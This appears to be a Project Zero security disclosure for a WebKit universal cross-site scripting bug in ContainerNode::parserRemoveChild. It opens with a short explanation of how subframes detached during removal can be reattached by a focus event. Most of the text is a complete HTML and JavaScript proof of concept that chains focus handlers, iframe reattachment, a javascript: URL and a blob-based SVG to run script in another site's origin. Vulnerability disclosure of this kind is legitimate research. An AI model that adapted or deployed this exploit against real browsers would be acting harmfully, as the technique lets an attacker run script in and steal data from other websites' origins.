Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1134
 
Here&#039;s a snippet of ContainerNode::parserRemoveChild.
 
void ContainerNode::parserRemoveChild(Node& oldChild)
{
    disconnectSubframesIfNeeded(*this, DescendantsOnly); <<---- (a)
    ...
    document().notifyRemovePendingSheetIfNeeded(); <<---- (b)
}
 
subframes are detached at (a). But In |notifyRemovePendingSheetIfNeeded| at (b), which fires a focus event, we can attach subframes again.
 
PoC:
-->
 
<html>
<head>
</head>
<body>
<script>
 
let xml = `
<body>
    <div>
        <b>
            <p>
                <script>
                let p = document.querySelector(&#039;p&#039;);
                let link = p.appendChild(document.createElement(&#039;link&#039;));
                link.rel = &#039;stylesheet&#039;;
                link.href = &#039;data:,aaaaazxczxczzxzcz&#039;;
 
                let btn = document.body.appendChild(document.createElement(&#039;button&#039;));
                btn.id = &#039;btn&#039;;
                btn.onfocus = () => {
                    btn.onfocus = null;
 
                    window.d = document.querySelector(&#039;div&#039;);
                    window.d.remove();
 
                    link.remove();
                    document.body.appendChild(p);
 
                    let m = p.appendChild(document.createElement(&#039;iframe&#039;));
                    setTimeout(() => {
                        document.documentElement.innerHTML = &#039;&#039;;
 
                        m.onload = () => {
                            m.onload = null;
 
                            m.src = &#039;javascript:alert(location);&#039;;
                            var xml = \`
<svg xmlns="http://www.w3.org/2000/svg">
<script>
document.documentElement.appendChild(parent.d);
</sc\` + \`ript>
<element a="1" a="2" />
</svg>\`;
 
                            var tmp = document.documentElement.appendChild(document.createElement(&#039;iframe&#039;));
                            tmp.src = URL.createObjectURL(new Blob([xml], {type: &#039;text/xml&#039;}));
                        };
                        m.src = &#039;https://abc.xyz/&#039;;
                    }, 0);
                };
 
                location.hash = &#039;btn&#039;;
                </scrip` + `t>
            </b>
        </p>
    </div>
</body>`;
 
let tf = document.body.appendChild(document.createElement(&#039;iframe&#039;));
tf.src = URL.createObjectURL(new Blob([xml], {type: &#039;text/html&#039;}));
 
</script>
</body>
</html>

